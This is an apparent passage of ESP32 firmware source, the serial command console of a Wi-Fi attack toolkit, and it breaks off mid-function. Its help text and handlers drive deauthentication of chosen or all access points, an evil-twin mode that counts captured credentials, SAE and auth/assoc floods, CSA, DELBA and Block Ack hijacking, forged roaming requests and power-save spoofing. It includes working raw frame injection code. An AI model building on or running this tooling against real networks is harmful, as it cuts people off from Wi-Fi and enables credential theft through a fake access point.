#include "serial_console.h"

#include <Arduino.h>
#include <WiFi.h>
#include <ctype.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <sdkconfig.h>
#include <stdlib.h>
#include <string.h>

#include "authflood.h"
#include "bsrp.h"
#include "console_commands.h"
#include "csa.h"
#include "deauth.h"
#include "delba.h"
#include "eapol.h"
#include "qosnull.h"
#include "radio.h"
#include "sae.h"
#include "tx_guard.h"
#include "baitap.h"
#include "wbus.h"
#include "btm.h"
#include "rrm.h"

#include "definitions.h"
#include "evil_twin.h"
#include "hexcap.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
#include "wireless_ui.h"
#endif

// File-scope on purpose: everything inside the anonymous namespace below has
// internal linkage, and this sink is handed to the wbus registry.
void wbus_serial_sink(const char* bytes);

namespace {

char g_line[112];
size_t g_len = 0;
int g_scan_count = 0;

TaskHandle_t s_scan_task = nullptr;
volatile bool s_scan_busy = false;

const char* auth_name(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA2/WPA3";
    case WIFI_AUTH_WAPI_PSK:
      return "WAPI";
    default:
      return "UNKNOWN";
  }
}

const char* attack_mode_label() {
  if (evil_twin_mode == EVIL_TWIN_CAPTURING) return "eviltwin";
  if (evil_twin_mode == EVIL_TWIN_DEAUTHING) return "eviltwin-deauth";
  return attack_mode_name();
}

const char* capabilities() {
#if CONFIG_SOC_WIFI_SUPPORT_5G
  return "deauth,eviltwin,probe,5g,baitap,btm,rrm,bsrp,eapol,qosnull,sae,authflood";
#else
  return "deauth,eviltwin,probe,baitap,btm,rrm,bsrp,eapol,qosnull,sae,authflood";
#endif
}

void ui_log(const char* text) {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_log(text);
#else
  (void)text;
#endif
}

void mac_to_str(const uint8_t* mac, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
           mac[5]);
}

void print_help() {
  Serial.println("INFO Wireless-Attack serial console");
  Serial.println("INFO HELP                          this text");
  Serial.println("INFO PING / STATUS / STATS         liveness, counters, per-AP counters");
  Serial.println("INFO SCAN                          scan APs (async)");
  Serial.println("INFO DEAUTH <idx> [reason]         deauth one AP");
  Serial.println("INFO DEAUTH_ALL [reason]           deauth every scanned AP");
  Serial.println("INFO DEAUTH_ONLY <i,j,..> [reason] deauth only these APs");
  Serial.println("INFO DEAUTH_EXCEPT <i,j,..>        deauth every AP except these");
  Serial.println("INFO STATIONS [sec]                discover client STAs (default 6s)");
  Serial.println("INFO PROBE_BROADCAST               flood fake APs (beacon + probe response)");
  Serial.println("INFO STOP                          stop the current attack");
  Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
  Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
  Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/ba/evil/btm/eapol/sae/authflood/qosnull)");
  Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
  Serial.println("INFO HEXD [type=n sub=n tid=n|het htc=0|1 ta=mac ra=mac] capture matching raw frames");
  Serial.println("INFO HEXLOG / HEXSTOP              print and clear captured frames / stop capture");
  Serial.println("INFO TIDMIX                         data, TID, HT Control and length counters");
  Serial.println("INFO RXRADIO                        last rx_ctrl radio metadata (unsupported fields = na)");
  Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
  Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
  Serial.println("INFO CSASTOP                       stop the CSA spoof");
  Serial.println("INFO CSATEST                       dump the CSA action/beacon bytes (format check)");
  Serial.println("INFO DELBA <idx> [reason]          DELBA spoof: tear down Block Ack sessions (1/32/37/38/39)");
  Serial.println("INFO DELBASTOP                     stop the DELBA spoof");
  Serial.println("INFO DELBATEST                     dump the DELBA action frame bytes (format check)");
  Serial.println("INFO BAATTACK <idx> [step]         BA-session hijack: DELBA -> forged ADDBA (SSN) -> BAR loop");
  Serial.println("INFO BASTOP                        stop the BA-session hijack");
  Serial.println("INFO BATEST                        dump the forged ADDBA Request / BAR bytes");
  Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
  Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
  Serial.println("INFO BARPUSH <idx> [step]          send only BARs (no ADDBA/DELBA), then stay silent");
  Serial.println("INFO BAITAP <idx> [pass] [ch] [max]   clone a BSS as the roaming target for BTM/RRM");
  Serial.println("INFO                               idx from SCAN; pass/skip = keep it open, ch 0 = same as the AP");
  Serial.println("INFO BAITAPSTOP                    tear the bait AP down");
  Serial.println("INFO BTM <idx> [timer] [sta-mac] [cand-bssid] [cand-ch] [cand-info]");
  Serial.println("INFO                               802.11v BTM Request: forced roam (needs PMF off)");
  Serial.println("INFO BTMSTOP                       stop the BTM Request spoof");
  Serial.println("INFO BTMTEST                       dump the BTM Request bytes (format check)");
  Serial.println("INFO RRM <idx> nbr <bssid> <ch> [count] [token] [info] [opclass] [phy] [sta-mac]");
  Serial.println("INFO                               802.11k Neighbor Report Response spoof (count=0 keeps going)");
  Serial.println("INFO RRMSTOP                       stop the Neighbor Report spoof");
  Serial.println("INFO RRMTEST                       dump the Neighbor Report Response bytes (format check)");
  Serial.println("INFO BSRP <idx> <aid> <ch> [rate_ms=5] [count] [sta-mac]");
  Serial.println("INFO                               HE BSRP Trigger; aid=0 learns the AID, ch=0 uses the AP channel");
  Serial.println("INFO BSRPSTOP                      stop the BSRP Trigger poll");
  Serial.println("INFO BSRPTEST                      annotate Trigger bytes; core schedule fields await a real capture");
  Serial.println("INFO BSRPFIELD [ul|gi|atp|ru|rssi|mcs] [value]  override/report the schedule fields (diagnostic)");
  Serial.println("INFO EAPOL <idx> [tid|-1] [sta-mac] EAPOL-Start/Logoff flood as a forged station");
  Serial.println("INFO EAPOLSTOP                     stop the EAPOL flood");
  Serial.println("INFO EAPOLTEST                     dump the EAPOL data frames (format check)");
  Serial.println("INFO QOSNULL <idx> [sta-mac]       forge a unicast QoS Null as a victim, flip the PM bit");
  Serial.println("INFO QOSNULLREL                    send PM=0 to every victim, then stop");
  Serial.println("INFO QOSNULLSTOP                   stop the PM-bit spoof");
  Serial.println("INFO QOSNULLTEST                   dump the QoS Null bytes (PM=1 / PM=0)");
  Serial.println("INFO SAE <idx> [point|rand] [gap_ms]  SAE Commit flood (WPA3), echoes anti-clogging token");
  Serial.println("INFO SAESTOP                       stop the SAE flood");
  Serial.println("INFO SAETEST                       dump the SAE Commit bytes (format check)");
  Serial.println("INFO AUTHFLOOD <idx> [both|auth|assoc] [noauto]  auth/assoc flood, upgrades to SAE on WPA3");
  Serial.println("INFO AUTHFLOODSTOP                 stop the auth/assoc flood");
  Serial.println("INFO AUTHFLOODTEST                 dump the forged auth/assoc bytes");
  Serial.println("INFO RESTART                       esp_restart() (recovery from an exhausted TX pool)");
  Serial.println("INFO WBUS / DESCRIBE [obj]         wbus: list objects / dump their methods and arguments");
  Serial.println("INFO CALL <obj>.<method> [k=v ..]  wbus keyword call, e.g. CALL deauth.start idx=3 reason=7");
  Serial.println("INFO EVTSUB [topic|pattern]        wbus event stream, default off; '*' suffix matches");
  Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
  Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
  Serial.println("INFO CTRLTEST [subtype] [broadcast|bssid] [dur]  10 control frames of that subtype (default RTS=11)");
  Serial.println("INFO CTRLFILTER [hex|all|none]     2nd-stage control-subtype filter: report or set it");
  Serial.println("INFO UIREASON / UI                 LVGL reason popup: open / report state");
}

// ------------------------------------------------------------------ parsing

int parse_index(char* token) {
  if (token == nullptr) return -1;
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token) return -1;
  return (int)value;
}

// MAC parsing lives in the bus now (wb_parse_mac); the console only needs the
// formatted output helper.
enum reason_kind_t { REASON_FIXED = 0, REASON_RANDOM, REASON_BAD };

struct reason_arg_t {
  reason_kind_t kind;
  uint16_t value;
};

bool token_iequals(const char* a, const char* b) {
  if (a == nullptr || b == nullptr) return false;
  while (*a != 0 && *b != 0) {
    if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
    a++;
    b++;
  }
  return *a == 0 && *b == 0;
}

// Accepted: nothing (default 1), "random"/"rand"/"r", or 1..65535.
// 0 is reserved in the standard and 2 bytes is the field width, so anything
// outside 1..65535 is rejected instead of silently becoming reason 1.
reason_arg_t parse_reason_arg(char* token) {
  reason_arg_t arg = {REASON_FIXED, 1};
  if (token == nullptr) return arg;
  if (token_iequals(token, "random") || token_iequals(token, "rand") ||
      token_iequals(token, "r")) {
    arg.kind = REASON_RANDOM;
    return arg;
  }
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token || *end != 0 || value <= 0 || value > 65535) {
    arg.kind = REASON_BAD;
    return arg;
  }
  arg.value = (uint16_t)value;
  return arg;
}

// Applies a parsed reason; false means "abort this command".
bool apply_reason_arg(const reason_arg_t& arg) {
  if (arg.kind == REASON_BAD) {
    Serial.println("ERR reason must be 1..65535, or 'random'");
    return false;
  }
  if (arg.kind == REASON_RANDOM) {
    attack_set_reason_random();
    return true;
  }
  attack_set_reason(arg.value);
  if (!attack_reason_is_defined(arg.value)) {
    Serial.printf("INFO reason %u is outside the defined set (1-11,13-24), clients may ignore it\n",
                  (unsigned)arg.value);
  }
  return true;
}

// console_scan_count() and console_apply_reason() are defined at file scope after
// the anonymous namespace closes -- bus_objects.cpp links against them, so they
// cannot be internal-linkage helpers.

int parse_index_list(char* text, int* out, int max) {
  if (text == nullptr) return 0;
  int count = 0;
  char* cursor = text;
  while (cursor != nullptr && *cursor != 0 && count < max) {
    char* next = strchr(cursor, ',');
    if (next != nullptr) {
      *next = 0;
    }
    const int value = parse_index(cursor);
    if (value >= 0) {
      out[count++] = value;
    }
    cursor = (next == nullptr) ? nullptr : next + 1;
  }
  return count;
}

// ------------------------------------------------------------------ commands

void do_scan() {
  prepare_radio_for_scan();
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_begin();
#endif
  g_scan_count = WiFi.scanNetworks();
  Serial.println("SCAN_BEGIN");
  for (int i = 0; i < g_scan_count; i++) {
    Serial.printf("NET %d %d %d %s %s %s\n", i, (int)WiFi.RSSI(i), (int)WiFi.channel(i),
                  auth_name(WiFi.encryptionType(i)), WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
    // Keep the String objects alive until the UI has copied the text: taking
    // c_str() straight into the struct leaves dangling pointers.
    const String ui_ssid = WiFi.SSID(i);
    const String ui_bssid = WiFi.BSSIDstr(i);
    const wireless_ui_network_t net = {
        .index = (uint16_t)i,
        .rssi = (int8_t)WiFi.RSSI(i),
        .channel = (uint8_t)WiFi.channel(i),
        .auth = auth_name(WiFi.encryptionType(i)),
        .bssid = ui_bssid.c_str(),
        .ssid = ui_ssid.c_str(),
    };
    wireless_ui_add_network(&net);
#endif
  }
  Serial.printf("SCAN_END %d\n", g_scan_count);
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_end(g_scan_count);
#endif
}

static void scan_task(void* arg) {
  (void)arg;
  for (;;) {
    ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
    do_scan();
    s_scan_busy = false;
  }
}

void start_scan() {
  if (s_scan_task == nullptr) {
    Serial.println("ERR scanner task not ready");
    return;
  }
  // A scan walks every channel, which would drag the bait AP off its channel and
  // drop whoever roamed onto it.
  if (baitap_running()) {
    Serial.println("ERR bait AP is up: BAITAPSTOP first, or clone from the last scan");
    return;
  }
  if (s_scan_busy) {
    Serial.println("ERR scan already running");
    return;
  }
  s_scan_busy = true;
  xTaskNotifyGive(s_scan_task);
}

void do_status() {
  int ui = 0;
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  ui = wireless_ui_ready() ? 1 : 0;
#endif
  Serial.print("STATUS mode=");
  Serial.print(attack_mode_label());
  Serial.print(" eliminated=");
  Serial.print(eliminated_stations);
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  {
    uint8_t prim = 0;
    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&prim, &sec);
    Serial.print(" ch=");
    Serial.print((int)prim);
  }
  Serial.print(" rx=");
  Serial.print((unsigned)attack_rx_frames());
  Serial.print(" rxm=");
  Serial.print((unsigned)attack_rx_matches());
  Serial.print(" txok=");
  Serial.print((unsigned)attack_tx_ok());
  Serial.print(" txerr=");
  Serial.print((unsigned)attack_tx_err());
  Serial.print(" txerr_nomem=");
  Serial.print((unsigned)attack_tx_err_nomem());
  Serial.print(" txerr_inval=");
  Serial.print((unsigned)attack_tx_err_invalid());
  Serial.print(" txerr_other=");
  Serial.print((unsigned)attack_tx_err_other());
  Serial.print(" txec=");
  Serial.print(attack_tx_last_err());
  Serial.print(" txdrop=");
  Serial.print((unsigned)attack_tx_dropped());
  Serial.print(" txg=");
  Serial.print((unsigned)tx_guard_throttled());
  Serial.print(" txgok=");
  Serial.print((unsigned)tx_guard_ok());
  Serial.print(" txgerr=");
  Serial.print((unsigned)tx_guard_err());
  Serial.print(" blind=");
  Serial.print((unsigned)attack_blind_frames());
  Serial.print(" hexf=");
  Serial.print((unsigned)hex_capture_hits());
  Serial.print(" hexdrop=");
  Serial.print((unsigned)hex_capture_drops());
  Serial.print(" rev=");
  Serial.print((unsigned)attack_reverse_frames());
  Serial.print(" csa=");
  Serial.print(csa_phase_name());
  Serial.print(" csaf=");
  Serial.print((unsigned)csa_frames());
  Serial.print(" csac=");
  Serial.print((unsigned)csa_clients());
  Serial.print(" csch=");
  Serial.print((unsigned)csa_new_channel());
  Serial.print(" csaauto=");
  Serial.print(csa_auto_channel() ? 1 : 0);
  Serial.print(" csacycle=");
  Serial.print((unsigned)csa_cycles());
  Serial.print(" csaauth=");
  Serial.print((unsigned)csa_auth_replies());
  Serial.print(" csarej=");
  Serial.print((unsigned)csa_assoc_rejects());
  Serial.print(" bait=");
  Serial.print(baitap_running() ? "on" : "off");
  Serial.print(" baitch=");
  Serial.print((unsigned)baitap_channel());
  Serial.print(" baitcl=");
  Serial.print((unsigned)baitap_clients());
  Serial.print(" baitj=");
  Serial.print((unsigned)baitap_joins());
  Serial.print(" baitl=");
  Serial.print((unsigned)baitap_leaves());
  Serial.print(" btm=");
  Serial.print(btm_state_name());
  Serial.print(" btmf=");
  Serial.print((unsigned)btm_frames());
  Serial.print(" btmc=");
  Serial.print((unsigned)btm_capable_clients());
  Serial.print(" btmskip=");
  Serial.print((unsigned)btm_skipped_clients());
  Serial.print(" btmresp=");
  Serial.print((unsigned)btm_responses());
  Serial.print(" btms=");
  Serial.print((unsigned)btm_last_status());
  Serial.print(" rrm=");
  Serial.print(rrm_mode_name());
  Serial.print(" rrmf=");
  Serial.print((unsigned)rrm_frames());
  Serial.print(" rrmc=");
  Serial.print((unsigned)rrm_clients());
  Serial.print(" rrmleft=");
  Serial.print((unsigned)rrm_remaining());
  Serial.print(" rrmtokhit=");
  Serial.print((unsigned)rrm_token_hits());
  Serial.print(" rrmreq=");
  Serial.print((unsigned)rrm_requests());
  Serial.print(" rrmresp=");
  Serial.print((unsigned)rrm_responses());
  Serial.print(" rrmch=");
  Serial.print((unsigned)rrm_candidate_channel());
  Serial.print(" rrmtok=");
  Serial.print((unsigned)rrm_token());
  Serial.print(" rrminfo=0x");
  Serial.printf("%08X", (unsigned)rrm_bssid_info());
  Serial.print(" rrmoc=");
  Serial.print((unsigned)rrm_op_class());
  Serial.print(" rrmphy=");
  Serial.print((unsigned)rrm_phy_type());
  Serial.print(" bsrp=");
  Serial.print(bsrp_active() ? "on" : "off");
  Serial.print(" bsrpf=");
  Serial.print((unsigned)bsrp_frames());
  Serial.print(" bsrpleft=");
  Serial.print((unsigned)bsrp_remaining());
  Serial.print(" bsrptxerr=");
  Serial.print((unsigned)bsrp_tx_errors());
  Serial.print(" bsrpref=");
  Serial.print((unsigned)bsrp_reference_triggers());
  Serial.print(" bsrpaid=");
  Serial.print((unsigned)bsrp_aid());
  Serial.print(" bsrplaid=");
  Serial.print(bsrp_aid_known() ? (unsigned)bsrp_learned_aid() : 0u);
  Serial.print(" bsrpch=");
  Serial.print((unsigned)bsrp_channel());
  Serial.print(" bsrprate=");
  Serial.print((unsigned)bsrp_rate_ms());
  Serial.print(" bsrpul=");
  Serial.print((unsigned)bsrp_ul_length());
  Serial.print(" bsrpru=");
  Serial.print((unsigned)bsrp_ru_allocation());
  Serial.print(" bsrpmcs=");
  Serial.print((unsigned)bsrp_mcs());
  Serial.print(" bsrprssi=");
  Serial.print((unsigned)bsrp_target_rssi());
  Serial.print(" eap=");
  Serial.print(eapol_active() ? "on" : "off");
  Serial.print(" eapf=");
  Serial.print((unsigned)eapol_frames());
  Serial.print(" eaprx=");
  Serial.print((unsigned)eapol_rx_from_ap());
  Serial.print(" eaprxreq=");
  Serial.print((unsigned)eapol_rx_eap_packets());
  Serial.print(" eaprxsta=");
  Serial.print((unsigned)eapol_rx_from_sta());
  Serial.print(" qn=");
  Serial.print(qosnull_mode_name());
  Serial.print(" qnf=");
  Serial.print((unsigned)qosnull_frames());
  Serial.print(" qn1=");
  Serial.print((unsigned)qosnull_pm1_frames());
  Serial.print(" qn0=");
  Serial.print((unsigned)qosnull_pm0_frames());
  Serial.print(" qnc=");
  Serial.print((unsigned)qosnull_clients());
  Serial.print(" qndl=");
  Serial.print((unsigned)qosnull_dl_frames());
  Serial.print(" qnrn=");
  Serial.print((unsigned)qosnull_rx_nulls());
  Serial.print(" qnrp=");
  Serial.print((unsigned)qosnull_rx_pm1());
  Serial.print(" sae=");
  Serial.print(sae_active() ? "on" : "off");
  Serial.print(" saesec=");
  Serial.print(sae_security_name(sae_security()));
  Serial.print(" saef=");
  Serial.print((unsigned)sae_frames());
  Serial.print(" saec=");
  Serial.print((unsigned)sae_identities());
  Serial.print(" saeresp=");
  Serial.print((unsigned)sae_responses());
  Serial.print(" saecode=");
  Serial.print((unsigned)sae_last_status());
  Serial.print(" saetok=");
  Serial.print((unsigned)sae_tokens());
  Serial.print(" saeecho=");
  Serial.print((unsigned)sae_echoed());
  Serial.print(" af=");
  Serial.print(authflood_active() ? "on" : "off");
  Serial.print(" aff=");
  Serial.print((unsigned)authflood_frames());
  Serial.print(" afa=");
  Serial.print((unsigned)authflood_auth_frames());
  Serial.print(" afs=");
  Serial.print((unsigned)authflood_assoc_frames());
  Serial.print(" afids=");
  Serial.print((unsigned)authflood_identities());
  Serial.print(" afst=");
  Serial.print((unsigned)authflood_last_status());
  Serial.print(" afup=");
  Serial.print(authflood_upgraded() ? 1 : 0);
  Serial.print(" delba=");
  Serial.print(delba_active() ? "on" : "off");
  Serial.print(" delbaf=");
  Serial.print((unsigned)delba_frames());
  Serial.print(" delbac=");
  Serial.print((unsigned)delba_clients());
  Serial.print(" delbat=");
  Serial.print((unsigned)delba_tid_mask());
  Serial.print(" delbab=");
  Serial.print((unsigned)delba_addba_seen());
  Serial.print(" delbar=");
  Serial.print((unsigned)delba_bar_seen());
  Serial.print(" bamode=");
  Serial.print(delba_ba_mode() ? 1 : 0);
  Serial.print(" baaddba=");
  Serial.print((unsigned)delba_ba_addba_frames());
  Serial.print(" babar=");
  Serial.print((unsigned)delba_ba_bar_frames());
  Serial.print(" badlba=");
  Serial.print((unsigned)delba_ba_delba_frames());
  Serial.print(" bassn=");
  Serial.print((unsigned)delba_ba_last_ssn());
  Serial.print(" baerr=");
  Serial.print((unsigned)delba_ba_errors());
  Serial.print(" bae=");
  Serial.print((int)delba_ba_last_error());
  Serial.print(" baplant=");
  Serial.print((unsigned)delba_ba_planted_frames());
  Serial.print(" delbtr=");
  Serial.print((unsigned)delba_triggered());
  Serial.print(" delbb=");
  Serial.print((unsigned)delba_blind_frames());
  Serial.print(" delbrv=");
  Serial.print((unsigned)delba_reverse_frames());
  Serial.print(" rxaddba=");
  Serial.print((unsigned)attack_rx_addba());
  Serial.print(" rxdelba=");
  Serial.print((unsigned)attack_rx_delba());
  Serial.print(" reason=");
  if (attack_reason_is_random()) {
    Serial.print("random");
  } else {
    Serial.print((unsigned)attack_reason_last());
  }
  Serial.print(" rlast=");
  Serial.print((unsigned)attack_reason_last());
  Serial.print(" networks=");
  Serial.print(g_scan_count);
  Serial.print(" creds=");
  Serial.print(captured_count);
  Serial.print(" heap=");
  Serial.print((unsigned)esp_get_free_heap_size());
  Serial.print(" ui=");
  Serial.print(ui);
  Serial.print(" caps=");
  Serial.println(capabilities());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_status(attack_mode_label(), eliminated_stations, g_scan_count, captured_count,
                     attack_deauth_frames(), attack_probe_frames());
#endif
}

void do_stats() {
  const int aps = attack_ap_count();
  Serial.print("STATS_BEGIN mode=");
  Serial.print(attack_mode_label());
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  Serial.print(" aps=");
  Serial.println(aps);
  for (int i = 0; i < aps; i++) {
    const uint8_t* bssid = nullptr;
    uint32_t frames = 0;
    uint8_t channel = 0;
    if (!attack_ap_info(i, &bssid, &frames, &channel)) {
      continue;
    }
    char mac[18];
    mac_to_str(bssid, mac);
    Serial.printf("AP %d %s ch%u frames=%u\n", i, mac, (unsigned)channel, (unsigned)frames);
  }
  Serial.println("STATS_END");
}

// MON <channel> <seconds>: passive capture on one channel (0 = hop 1..13).
// Counters are reset on entry, so a following RXMIX describes exactly this window.
void do_monitor(char* ch_token, char* sec_token) {
  const long channel = ch_token ? strtol(ch_token, nullptr, 10) : 0;
  const long seconds = sec_token ? strtol(sec_token, nullptr, 10) : 10;
  if (channel < 0 || channel > 196) {
    Serial.println("ERR monitor channel must be 0 (hop) or 1..196");
    return;
  }
  if (seconds < 1 || seconds > 120) {
    Serial.println("ERR monitor seconds must be 1..120");
    return;
  }
  attack_stop();
  monitor_begin((uint8_t)channel, (uint16_t)seconds);
  Serial.printf("OK MON ch=%ld %lds\n", channel, seconds);
  ui_log("monitor started");
}

// Prints what the driver *thinks* its sniffer configuration is: whether
// promiscuous mode is on, the type mask (mgmt/ctrl/data), the control-subtype
// mask (documented default: none filtered) and the current channel. Diagnostic,
// so a claim like "control frames are filtered" can be checked instead of guessed.
// Injects a handful of RTS control frames. Purpose: decide whether a control
// frame that is *known* to be on air can be reported through the sniffer at all.
// If a second board's RXMIX counts them, control reception works and any zero in
// live traffic means "ACK/BA are consumed by the radio", not "filtered".
// Second-stage sniffer filter: which control subtypes are let through. The
// first stage (esp_wifi_set_promiscuous_filter) only decides whether the *class*
// control is reported; without this one the driver drops every control frame.
// Semantics of the mask are the opposite of the type mask (bits = subtypes to
// drop), so this command exists to pin it down on real hardware instead of
// trusting either reading of the header comment.
void do_ctrl_filter(char* token) {
  wifi_promiscuous_filter_t filter = {0};
  if (token == nullptr) {
    esp_wifi_get_promiscuous_ctrl_filter(&filter);
    Serial.printf("CTRLFILTER mask=0x%08X\n", (unsigned)filter.filter_mask);
    return;
  }
  uint32_t mask;
  if (strcmp(token, "all") == 0) {
    // MASK_ALL stops at subtype 7; the 802.11ax control subtypes (Trigger 2,
    // TACK 3, BFRP 4, NDPA 5, extension 6 = bits 18..22) have to be added by
    // hand, or "all" silently means "no HE control frames".
    mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL | (0x7Cu << 16);
  } else if (strcmp(token, "none") == 0) {
    mask = 0;
  } else {
    mask = (uint32_t)strtoul(token, nullptr, 0);
  }
  filter.filter_mask = mask;
  const esp_err_t err = esp_wifi_set_promiscuous_ctrl_filter(&filter);
  wifi_promiscuous_filter_t readback = {0};
  esp_wifi_get_promiscuous_ctrl_filter(&readback);
  Serial.printf("OK CTRLFILTER set=0x%08X readback=0x%08X err=%d\n", (unsigned)mask,
                (unsigned)readback.filter_mask, (int)err);
}

// Control-frame TX probe: subtype, receiver address and Duration/ID are all
// parameters, because each of them turned out to matter for whether a PS-Poll
// reaches the air (测试报告 §4.4.9). Same frame length for every variant, so only
// the field under test changes.
void do_ctrl_test(char* sub_token, char* ra_token, char* dur_token) {
  long subtype = sub_token ? strtol(sub_token, nullptr, 0) : 11;
  if (subtype < 0 || subtype > 15) {
    Serial.println("ERR usage: CTRLTEST [subtype 0-15] [broadcast|bssid] [duration]");
    return;
  }
  const bool to_bssid = token_iequals(ra_token, "bssid");
  const long dur = dur_token ? strtol(dur_token, nullptr, 0) : 0;
  if (dur < 0 || dur > 0xFFFF) {
    Serial.println("ERR duration must be 0..0xFFFF");
    return;
  }
  uint8_t rts[16];
  int sent = 0;
  for (int i = 0; i < 10; i++) {
    memset(rts, 0, sizeof(rts));
    rts[0] = (uint8_t)(0x04 | ((subtype & 0x0F) << 4));  // control frame, subtype
    rts[1] = 0x00;
    rts[2] = (uint8_t)(dur & 0xFF);
    rts[3] = (uint8_t)((dur >> 8) & 0xFF);
    if (to_bssid) {
      // needs a target: the AP of the last scan entry
      const uint8_t* bssid = g_scan_count > 0 ? WiFi.BSSID((uint8_t)0) : nullptr;
      if (bssid == nullptr) {
        Serial.println("ERR CTRLTEST bssid: run SCAN first");
        return;
      }
      memcpy(rts + 4, bssid, 6);
    } else {
      memset(rts + 4, 0xFF, 6);  // RA = broadcast
    }
    rts[10] = 0x02;  // TA = locally administered placeholder
    rts[11] = 0x00;
    rts[12] = 0x00;
    rts[13] = 0xAA;
    rts[14] = 0xBB;
    rts[15] = 0xCC;
    if (esp_wifi_80211_tx(WIFI_IF_STA, rts, sizeof(rts), false) == ESP_OK) {
      sent++;
    }
    delay(5);
  }
  Serial.printf("OK CTRLTEST subtype=%ld ra=%s dur=0x%04X sent=%d\n", subtype,
                to_bssid ? "bssid" : "broadcast", (unsigned)dur, sent);
}

// BAATTACK <idx> [step]: hijack the Block Ack sessions of one AP by planting its
// reorder windows. Needs the sniffer, so any running attack is stopped first.
// BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
// more transmission. If the peer's reorder window really moved, its QoS stream
// stays dead while we are silent.
// ---- 802.11v BTM Request ----

// ---- EAPOL ----

// ---- QoS Null PM-bit spoof ----

// ---- SAE commit flood ----

// ---- auth / assoc flood ----

void do_stop() {
  attack_stop();
  Serial.printf("OK STOP deauth_frames=%u probe_frames=%u\n",
                (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
  ui_log("stopped");
}

void do_stations(char* seconds_token) {
  int seconds = parse_index(seconds_token);
  if (seconds <= 0 || seconds > 60) {
    seconds = 6;
  }
  stations_begin((uint16_t)seconds);
  Serial.printf("OK STATIONS scanning for %ds\n", seconds);
}

void print_stations() {
  Serial.println("STA_BEGIN");
  const int count = stations_count();
  for (int i = 0; i < count; i++) {
    const uint8_t* mac = nullptr;
    const uint8_t* ap = nullptr;
    uint8_t channel = 0;
    int16_t rssi = 0;
    uint32_t frames = 0;
    if (!stations_info(i, &mac, &ap, &channel, &rssi, &frames)) {
      continue;
    }
    char mac_text[18];
    char ap_text[18];
    mac_to_str(mac, mac_text);
    mac_to_str(ap, ap_text);
    Serial.printf("STA %d %s %s ch%u %ddB frames=%u\n", i, mac_text, ap_text, (unsigned)channel,
                  (int)rssi, (unsigned)frames);
  }
  Serial.printf("STA_END %d\n", count);
}

void do_rxlog() {
  const int count = attack_rx_log_count();
  Serial.print("RXLOG_BEGIN ");
  Serial.println(count);
  for (int i = 0; i < count; i++) {
    uint8_t dest[6], src[6], bssid[6], type = 0, subtype = 0;
    uint16_t len = 0;
    if (!attack_rx_log_at(i, dest, src, bssid, &type, &subtype, &len)) continue;
    char d[18], s[18], b[18];
    mac_to_str(dest, d);
    mac_to_str(src, s);
    mac_to_str(bssid, b);
    Serial.print("RX ");
    Serial.print(i);
    Serial.print(" type=");
    Serial.print((unsigned)type);
    Serial.print(" sub=");
    Serial.print((unsigned)subtype);
    Serial.print(" len=");
    Serial.print((unsigned)len);
    Serial.print(" dest=");
    Serial.print(d);
    Serial.print(" src=");
    Serial.print(s);
    Serial.print(" bssid=");
    Serial.print(b);
    rx_radio_t radio = {};
    if (attack_rx_log_radio(i, &radio)) {
      char rate_text[12];
      Serial.printf(" rssi=%d ch=%u dur=%u fmt=%u rate=%s", (int)radio.rssi,
                    (unsigned)radio.channel, (unsigned)radio.duration, (unsigned)radio.fmt,
                    rx_rate_text(radio.fmt, radio.rate, radio.mcs, radio.sgi, rate_text,
                                 (int)sizeof(rate_text)));
    }
    uint8_t cat = 0;
    uint8_t act = 0;
    uint8_t nch = 0;
    uint8_t cnt = 0;
    attack_rx_log_info(i, &cat, &act, &nch, &cnt);
    if (subtype == 13) {
